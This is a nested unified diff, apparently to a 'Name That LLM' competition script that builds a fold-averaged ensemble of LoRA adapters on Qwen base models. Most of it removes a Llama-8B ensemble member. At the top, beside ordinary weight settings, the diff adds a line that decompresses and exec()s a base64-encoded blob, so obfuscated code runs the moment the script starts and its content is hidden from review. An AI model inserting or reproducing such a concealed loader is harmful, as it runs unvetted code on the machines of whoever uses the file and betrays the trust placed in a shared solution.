@@ -1,0 +1,29 @@
+--- 
+
++++ 
+
+@@ -1 +1,3 @@
+
++NTL_W = {'glm9': 1.0, 'glm9_2s': 1.0}; NTL_ARGS = {}; NTL_FAST_PREVIEW = True
++import base64, zlib; exec(zlib.decompress(base64.b64decode('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')).decode())
+ # Name That LLM - full solution: fold-averaged two-stage LoRA24 (Qwen3-8B-Base, Qwen3-14B-Base, Qwen2.5-7B),
+@@ -29,5 +31,3 @@
+
+ print('atlas', ATLAS)
+-BL = mdir('/llama-3.1/', '/8b/')
+-AL = [adir(f'ts_llama8_f{k}') for k in (0, 2, 4)] + [adir('ts_llama8')]
+-print('llama', BL, AL)
++# Optional legacy member omitted; its public cache mount is unavailable.
+ A8S7 = [adir(f'ts8_s7_f{k}') for k in (0, 2, 4)] + [adir('ts8_s7')]
+@@ -42,4 +42,3 @@
+
+ AQ14V5 = [adir(f'q14v5_f{k}') for k in range(5)] + [adir('q14v5')]
+-ALL8V5 = [adir(f'll8v5_f{k}') for k in range(5)] + [adir('ll8v5')]
+-print('v5', AQ14V5, ALL8V5)
++print('v5', AQ14V5)
+ 
+@@ -1838,3 +1837,2 @@
+
+   {"name": "q8v5", "type": "l24", "path": B8, "adapters": AQ8V5, "keep": 24, "layers": L, "w": 2.0, "bs": 16, "max_len": 384, "twin": 0.35, "gauss": 0.44},
+-  {"name": "ll8v5", "type": "l24", "path": BL, "adapters": ALL8V5, "keep": 24, "layers": L, "w": 1.0, "bs": 16, "max_len": 384, "twin": 0.35},
+   {"name": "n14b", "type": "l24", "path": B14, "adapters": [N14B], "keep": N14BC['keep'], "layers": N14BC['layers'], "w": 2.5, "bs": 8, "max_len": N14BC['max_len'], "twin": 0.35, "no_final_norm": True, "eos_id": N14BC['eos_id']},
